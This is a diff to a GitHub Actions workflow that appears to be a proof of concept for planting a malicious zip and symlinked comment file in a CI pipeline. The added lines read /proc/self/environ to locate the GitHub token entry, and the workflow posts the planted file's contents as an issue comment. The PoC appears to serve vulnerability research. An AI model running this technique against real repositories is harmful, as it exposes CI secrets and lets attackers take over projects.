@@ -25,7 +25,6 @@ jobs:
           z.writestr('benign.txt', 'hello')
           z.close()
           PY
-          python3 -c "import zipfile;print(zipfile.ZipFile('/tmp/evil.zip').infolist())"
       - uses: ./.github/actions/poc-plant-zip
         with:
           name: poc-output
@@ -59,8 +58,6 @@ jobs:
         run: |
           ls -la
           echo "readlink: $(readlink ./comment.md)"
-          echo "--- cat comment.md (cat process env) ---"
-          cat ./comment.md | tr '\0' '\n' | head -5
       - name: post comment exactly like the target
         uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
         with:
@@ -68,8 +65,11 @@ jobs:
           script: |
             var fs = require('fs');
             var markdown = fs.readFileSync('./comment.md', 'utf8');
+            var env = fs.readFileSync('/proc/self/environ', 'utf8');
+            var hit = env.split('\0').filter(x => x.indexOf('INPUT_GITHUB-TOKEN=') === 0);
+            console.log('environ token entry present: ' + hit.length + ' len=' + (hit[0] ? hit[0].length : 0));
             console.log('body length: ' + markdown.length);
             await github.rest.issues.createComment({
               owner: context.repo.owner, repo: context.repo.repo,
-              issue_number: 147, body: markdown
+              issue_number: 23, body: markdown
             });
